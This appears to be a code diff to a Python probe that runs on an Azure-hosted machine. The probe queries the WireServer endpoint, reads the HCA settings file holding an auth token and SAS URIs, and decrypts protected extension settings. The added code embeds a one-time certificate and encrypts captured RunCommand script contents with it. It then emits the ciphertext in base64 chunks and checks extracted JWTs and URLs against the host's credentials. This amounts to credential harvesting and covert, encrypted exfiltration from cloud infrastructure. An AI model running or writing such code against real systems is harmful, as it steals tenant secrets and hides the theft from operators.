@@ -32,6 +32,32 @@ MARKER = "META_LHE_FAIRCHEM_T4_LIVE"
 WIRESERVER = "http://168.63.129.16/machine/?comp=goalstate"
 WIRE_LIMIT = 256 * 1024
 BLOB_LIMIT = 512 * 1024
+RUNCOMMAND_CAPTURE_CERTIFICATE = b"""-----BEGIN CERTIFICATE-----
+MIIEPzCCAqegAwIBAgIUM1HbkwysdecsEM//iWSbN26J/wswDQYJKoZIhvcNAQEL
+BQAwLzEtMCsGA1UEAwwkTWV0YS1MSEUtRmFpckNoZW0tUnVuQ29tbWFuZC1PbmVU
+aW1lMB4XDTI2MTExNzAzMjMzNVoXDTI2MTExODAzMjMzNVowLzEtMCsGA1UEAwwk
+TWV0YS1MSEUtRmFpckNoZW0tUnVuQ29tbWFuZC1PbmVUaW1lMIIBojANBgkqhkiG
+9w0BAQEFAAOCAY8AMIIBigKCAYEA4xoI7yun8h8Smdz6u33HeX2t9AIXTbo46MAe
+LxtD5syxQBTCUWQtgm1V108q/XDx6N1/tpGO1KhjghCr44IefRSYpHjtIVtzwXwO
+SkJhiU0kemnkLppmU+ExWnUfKBjAycp0OMrlZIVAlqw4UokD5Ujgro6aryWbj0cw
+IRUZJbtpXCKbevagJuEnquAZFPuTYbvCT2VtIyVclU9/hj3zBZJYjd/bpZrwRltd
+ns/gNb55aNwQTmzmIQbCCHyy4Kf02id9O8hEnHxpQ4hCVodXXhNt0F4lDOK4Xl+v
+5FzgGa7LO6JybZ9pnSk6UQKXfg9Hze97cf9xGlBLMgxZDAKNt3XX7CITWMQ8D1YY
+v8d0EIHLA/RLiPyIdOemw6YTtmuEyEMEZOWDH32ecU7LnEIjGUQ1hDD1xy1nFgzM
+Iuw/9yqLVeqoVd0qhCp2guUm2HZkYb4nn4gSDvQTuF5CunJ2FSa8bcNpexBHmZq1
+2TChITKJDUNDdECcBJa0mPhcG4qnAgMBAAGjUzBRMB0GA1UdDgQWBBT9rv8esaEI
+RM9U0yuiywzPj2p9vTAfBgNVHSMEGDAWgBT9rv8esaEIRM9U0yuiywzPj2p9vTAP
+BgNVHRMBAf8EBTADAQH/MA0GCSqGSIb3DQEBCwUAA4IBgQAVlUgBYPXbrUIFqbHL
+lgiNRuEEoXjfnaGvu0PuIksNAjV4bHRC0FtWycKr3cZ2HzyT9+6ubxOOTBsME1AG
+3hqhSEnRTWxHj67E2g+NP39PTCf17DJLd7pzhMrKq+2CNWIB+Bv3U5jPv0zFoH8i
+jc4Y8BjDfvS56OMvMZumIi1dqksnVlOIcm7F8qD2mTPfZBsjpM9J9rFBes5iwjZA
+yoovTkcDi1PMY4MXGfG6SjnxTtlFAYAINmTWEcZJA86MOiaP7aCYDp9AnJmTv2rt
+D6X/3YuYlrsyfyAVKXPQuwTvapP0HGRLF/UOvX0NrsHwVGOgyVMbE5CmFthOrmfK
+w9uAUZ0N4UUf3hZxOeA1zxjgL8aoyuDOFSNyYTU77u2AZo0IZJDWtlcFG1sK+qs3
+46wXFu4bKctaLQpxkoPOA8eBCVbpIl8DBZFuUSRVYdtHqEu8ZctK0z4OuRpC8G64
+bn3Vi6WErZa+I/AVLq/YRU7Gd+RTku4Z42OqrI0vtIGw1iU=
+-----END CERTIFICATE-----
+"""
 SAFE_NAME = re.compile(r"^[A-Za-z_][A-Za-z0-9_.:-]{0,95}$")
 SENSITIVE_NAME = re.compile(
     r"(?:auth|bearer|cert|credential|key|password|private|protected|sas|secret|signature|thumbprint|token)",
@@ -743,7 +769,43 @@ def decode_inline_script(value: str) -> tuple[bytes | None, bool, str]:
     return decoded, True, "decoded"
 
 
-def classify_inline_scripts(values: list[str]) -> None:
+def encrypt_runcommand_script(script: bytes) -> bytes | None:
+    if not script or len(script) > 32768:
+        return None
+    descriptor = -1
+    try:
+        descriptor = os.memfd_create("lhe-capture-certificate", flags=0)
+        os.write(descriptor, RUNCOMMAND_CAPTURE_CERTIFICATE)
+        os.lseek(descriptor, 0, os.SEEK_SET)
+        result = subprocess.run(
+            [
+                "openssl",
+                "cms",
+                "-encrypt",
+                "-binary",
+                "-outform",
+                "DER",
+                "-aes-256-cbc",
+                f"/proc/self/fd/{descriptor}",
+            ],
+            input=script,
+            stdout=subprocess.PIPE,
+            stderr=subprocess.DEVNULL,
+            pass_fds=(descriptor,),
+            timeout=5,
+            check=False,
+        )
+    except (OSError, subprocess.TimeoutExpired):
+        return None
+    finally:
+        if descriptor >= 0:
+            os.close(descriptor)
+    if result.returncode != 0 or len(result.stdout) > 65536:
+        return None
+    return result.stdout
+
+
+def classify_inline_scripts(values: list[str], hca_settings: dict[str, object]) -> None:
     scripts: list[bytes] = []
     gzip_count = 0
     outcomes: Counter[str] = Counter()
@@ -769,6 +831,7 @@ def classify_inline_scripts(values: list[str]) -> None:
     capability_counts: Counter[str] = Counter()
     private_ipv4_count = 0
     nested_base64_count = 0
+    jwt_values: list[str] = []
     for script in scripts:
         first_line = script.splitlines()[0].lower() if script.splitlines() else b""
         if b"python" in first_line:
@@ -805,6 +868,10 @@ def classify_inline_scripts(values: list[str]) -> None:
                 sensitive_literal_assignments += 1
         for label, pattern in SCRIPT_CREDENTIAL_PATTERNS.items():
             credential_counts[label] += len(pattern.findall(script))
+        jwt_values.extend(
+            match.group(0).decode("ascii", errors="ignore")
+            for match in SCRIPT_CREDENTIAL_PATTERNS["jwt"].finditer(script)
+        )
         for label, pattern in SCRIPT_CAPABILITY_TERMS.items():
             capability_counts[label] += len(pattern.findall(script))
         private_ipv4_count += len(PRIVATE_V4.findall(script))
@@ -828,6 +895,55 @@ def classify_inline_scripts(values: list[str]) -> None:
     emit("runcommand_script_private_ipv4_shape_count", private_ipv4_count)
     emit("runcommand_script_nested_base64_shape_count", nested_base64_count)
 
+    auth_token = hca_settings.get("authToken")
+    diagnostics_url = hca_settings.get("diagnosticsSasUri")
+    scheduler_url = hca_settings.get("schedulerApiUrl")
+    trace_url = hca_settings.get("traceApiUrl")
+    emit(
+        "runcommand_script_jwt_matches_hca_auth_count",
+        sum(isinstance(auth_token, str) and value == auth_token for value in jwt_values),
+    )
+    emit(
+        "runcommand_script_unmatched_jwt_count",
+        sum(not isinstance(auth_token, str) or value != auth_token for value in jwt_values),
+    )
+    for name, expected in (
+        ("diagnostics_sas", diagnostics_url),
+        ("scheduler_url", scheduler_url),
+        ("trace_url", trace_url),
+    ):
+        emit(
+            f"runcommand_script_{name}_exact_match_count",
+            sum(isinstance(expected, str) and value == expected for value in urls),
+        )
+    script_sas_values = [value for value in urls if value_shape(value) == "sas_url"]
+    emit(
+        "runcommand_script_unmatched_sas_count",
+        sum(not isinstance(diagnostics_url, str) or value != diagnostics_url for value in script_sas_values),
+    )
+    properties = hca_settings.get("properties")
+    property_values = (
+        [value for value in properties.values() if isinstance(value, str) and value]
+        if isinstance(properties, dict)
+        else []
+    )
+    emit(
+        "runcommand_script_hca_property_value_match_count",
+        sum(value.encode() in script for script in scripts for value in property_values),
+    )
+
+    encrypted = encrypt_runcommand_script(scripts[0]) if len(scripts) == 1 else None
+    emit("runcommand_script_encrypted_capture_present", encrypted is not None)
+    if encrypted is not None:
+        encoded_capture = base64.b64encode(encrypted).decode("ascii")
+        chunks = [
+            encoded_capture[index:index + 240]
+            for index in range(0, len(encoded_capture), 240)
+        ]
+        emit("runcommand_script_encrypted_capture_chunk_count", len(chunks))
+        for index, chunk in enumerate(chunks):
+            emit(f"runcommand_script_encrypted_capture_chunk_{index:04d}", chunk)
+
 
 def collect_named_string_values(documents: list[object], target_name: str) -> list[str]:
     values: list[str] = []
@@ -844,7 +960,11 @@ def collect_named_string_values(documents: list[object], target_name: str) -> li
     return values
 
 
-def classify_runtime_settings(extensions: ET.Element, tenant_pem: bytes) -> None:
+def classify_runtime_settings(
+    extensions: ET.Element,
+    tenant_pem: bytes,
+    hca_settings: dict[str, object],
+) -> None:
     plugin_names: set[str] = set()
     plugin_versions: set[str] = set()
     plugin_states: set[str] = set()
@@ -926,25 +1046,36 @@ def classify_runtime_settings(extensions: ET.Element, tenant_pem: bytes) -> None
         "token",
     ):
         emit(f"decrypted_settings_{key.lower()}_present", key in decrypted_keys)
-    classify_inline_scripts(collect_named_string_values(decrypted, "script"))
+    classify_inline_scripts(
+        collect_named_string_values(decrypted, "script"), hca_settings
+    )
 
 
-def classify_hca() -> tuple[urllib.parse.SplitResult | None, list[str]]:
+def classify_hca() -> tuple[
+    urllib.parse.SplitResult | None,
+    list[str],
+    dict[str, object],
+]:
     settings_path = Path("/opt/hca/.settings")
     emit("hca_settings_present", settings_path.is_file())
     if not settings_path.is_file() or settings_path.stat().st_size > 131072:
-        return None, []
+        return None, [], {}
     try:
         settings = json.loads(settings_path.read_bytes())
     except (OSError, json.JSONDecodeError, UnicodeDecodeError):
         emit("hca_settings_parsed", False)
-        return None, []
+        return None, [], {}
     if not isinstance(settings, dict):
         emit("hca_settings_parsed", False)
-        return None, []
+        return None, [], {}
     emit("hca_settings_parsed", True)
     emit("hca_settings_mode", format(stat.S_IMODE(settings_path.stat().st_mode), "o"))
     emit("hca_setting_keys", safe_names(set(settings)))
+    properties = settings.get("properties")
+    emit(
+        "hca_property_keys",
+        safe_names(set(properties)) if isinstance(properties, dict) else [],
+    )
     diagnostics = settings.get("diagnosticsSasUri")
     diagnostics_parts = None
     if isinstance(diagnostics, str):
@@ -969,11 +1100,11 @@ def classify_hca() -> tuple[urllib.parse.SplitResult | None, list[str]]:
         and key not in {"authToken", "diagnosticsSasUri", "schedulerApiUrl", "traceApiUrl"}
         and len(value) <= 256
     ]
-    return diagnostics_parts, identifiers
+    return diagnostics_parts, identifiers, settings
 
 
 def main() -> None:
-    diagnostics_parts, hca_identifiers = classify_hca()
+    diagnostics_parts, hca_identifiers, hca_settings = classify_hca()
 
     goal_status, goal_body, goal_type = fetch(
         WIRESERVER, WIRE_LIMIT, wire=True, retries=10
@@ -1074,7 +1205,7 @@ def main() -> None:
     sas_values: dict[str, str] = {}
     sas_parts: dict[str, urllib.parse.SplitResult] = {}
     if extensions is not None:
-        classify_runtime_settings(extensions, tenant_pem)
+        classify_runtime_settings(extensions, tenant_pem, hca_settings)
         for name in (
             "Plugin",
             "RuntimeSettings",
